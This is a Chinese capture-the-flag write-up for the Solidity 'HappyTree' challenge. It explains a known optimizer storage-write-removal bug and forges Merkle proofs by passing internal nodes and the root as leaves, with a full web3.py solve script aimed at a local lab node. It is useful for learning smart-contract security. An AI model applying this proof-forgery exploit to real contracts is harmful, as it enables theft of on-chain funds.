# HappyTree

## 源码

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Greeter {
    uint256 public x;
    uint256 public y;
    bytes32 public root;
    mapping(bytes32 => bool) public used_leafs;

    constructor(bytes32 root_hash) {
        root = root_hash;
        //0xb57c9b430ecc5b184f7ab285b8c9ca898e3e528c4668d136ee0fab03ae716f86
    }

    modifier onlyGreeter() {
        require(msg.sender == address(this));
        _;
    }

    function g(bool a) internal returns (uint256, uint256) {
        if (a) return (0, 1);
        assembly {
            return(0, 0)
        }
    }

    function a(uint256 i, uint256 n) public onlyGreeter {
        x = n;
        g((n <= 2));
        x = i;
    }

    function b(
        bytes32[] calldata leafs,
        bytes32[][] calldata proofs,
        uint256[] calldata indexs
    ) public {
        require(leafs.length == proofs.length, "Greeter: length not equal");
        require(leafs.length == indexs.length, "Greeter: length not equal");

        for (uint256 i = 0; i < leafs.length; i++) {
            require(
                verify(proofs[i], leafs[i], indexs[i]),
                "Greeter: proof invalid"
            );
            require(used_leafs[leafs[i]] == false, "Greeter: leaf has be used");
            used_leafs[leafs[i]] = true;
            this.a(i, y);
            y++;
        }
    }

    function verify(
        bytes32[] memory proof,
        bytes32 leaf,
        uint256 index
    ) internal view returns (bool) {
        bytes32 hash = leaf;

        for (uint256 i = 0; i < proof.length; i++) {
            bytes32 proofElement = proof[i];

            if (index % 2 == 0) {
                hash = keccak256(abi.encodePacked(hash, proofElement));
            } else {
                hash = keccak256(abi.encodePacked(proofElement, hash));
            }

            index = index / 2;
        }

        return hash == root;
    }

    function isSolved() public view returns (bool) {
        return x == 2 && y == 4;
    }
}
```

## 题解

注：需要本地复现的话要开编译优化

```
./solc -o ./build --bin --abi --asm --via-ir --optimize Example.sol
```

看起来是一个验证MerkleTree的合约，目标是x == 2 && y == 4

成功验证一次 y++，x也会在 a() 函数里面改变，但是假如验证了4次，最后也会x=3, y=4，无法完成要求

这是solidity优化器的一个bug，参考：

[Storage Write Removal Bug On Conditional Early Termination | Solidity Programming Language (soliditylang.org)](https://soliditylang.org/blog/2022/09/08/storage-write-removal-before-conditional-termination/)

影响范围 0.8.13 ≤ version < 0.8.17

有代码如下

```js
contract C {
	uint public x;
	function f(bool a) public {
		x = 1; // This write is removed due to the bug.
		g(a);
    x = 2;
	}
	function g(bool a) internal {
		if (a) return;
		assembly { return(0,0) }
	}
}
```

在预期情况下，调用`f(false)`将使x变量值为1，但有Bug的实际结果为0

可见，该Bug使EVM 回退了 `x = 1;` 的Storage写入操作

`assembly { return(0, 0) }`，实际作用是终止整个交易，返回到最初始的caller

题目源码里采用 `this.a(i, y);` 而不是`a(i,y)`

因为这相当于发起了一个内联交易，停止的只是内联交易而不是整个我们的verify，因此不影响下一句 y++

根据以上bug，验证4次后确实能够完成x == 2 && y == 4，接下来是具体题解

题目给出了三个hash，再加上root可以读取，得到：

```
alice: 0x81376b9868b292a46a1c486d344e427a3088657fda629b5f4a647822d329cd6a
Bob:   0x28cac318a86c8a0a6a9156c2dba2c8c2363677ba0514ef616592d81557e679b6
Calor: 0x804cd8981ad63027eb1d4a7e3ac449d0685f3660d6d8b1288eb12d345ca2331d
root:  0xb57c9b430ecc5b184f7ab285b8c9ca898e3e528c4668d136ee0fab03ae716f86
```

先构造出整棵MerkleTree

```
							root
                          /		\
				(alice, bob)	(calor, calor)
				/		\			/		\
			alice		Bob		Calor		Calor
```

随便挑4条路径，也没有检查叶子的高度，直接拿root来验证都行

python脚本

```python
from web3 import Web3, HTTPProvider
import json
import requests
import time

SERVER_IP  = '192.168.21.128'    # change this
GETH_PORT  = '8545'
FAUCET_PORT = '8080'
web3 = Web3(Web3.HTTPProvider(f'http://{SERVER_IP}:{GETH_PORT}')) 
assert web3.isConnected()

private_key = "xxx"
account = web3.eth.account.from_key(private_key)
hacker, sk_hacker = account.address, account.key
print('[+] hacker:', hacker)
print('[+] hakcer key:', sk_hacker.hex())

assert(requests.post(f"http://{SERVER_IP}:{FAUCET_PORT}/api/claim", data={"address": account.address}).status_code == 200)
time.sleep(5)
balance = web3.eth.getBalance(account.address)
print(balance)

gas_price=5
gas_limit=6000000
challeng_address = "0xdBC0157B3f66aec5001F9975e756B83B1357dB98"
with open('challenge.abi', 'r') as f:
    abi = json.load(f)
challange = web3.eth.contract(address=challeng_address, abi=abi)

print(challange.caller.x())
print(challange.caller.y())
print(challange.caller.root().hex())
root = challange.caller.root().hex()

Alice = "0x81376b9868b292a46a1c486d344e427a3088657fda629b5f4a647822d329cd6a"
Bob = "0x28cac318a86c8a0a6a9156c2dba2c8c2363677ba0514ef616592d81557e679b6"
Calor = "0x804cd8981ad63027eb1d4a7e3ac449d0685f3660d6d8b1288eb12d345ca2331d"
ab = "0x9b1a0a45cfdc60f45820808958c1895d44da61c8f804f5560020a373b23ad51e"
cc = "0x4a35f5bda2916fbfac6936f63313cee16979995b2409de59ceda0377bae8c486"

tx = challange.functions.b([root, ab, cc, Alice], [[], [cc], [ab], [Bob, cc]], [0, 0, 1, 0]).buildTransaction({
    "from": account.address,
    'gasPrice': web3.toWei(gas_price, 'gwei'),
    "gas": gas_limit,
    "nonce": web3.eth.getTransactionCount(account.address),
    "value": web3.toWei(0, 'ether'),
})

signed_tx = account.signTransaction(tx)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction).hex()
print(tx_hash)

receipt = web3.eth.waitForTransactionReceipt(tx_hash)
assert receipt['status'] == 1
print('[+] receipt:', receipt)
print('[+] x:', challange.caller.x())
print('[+] y:', challange.caller.y())
```

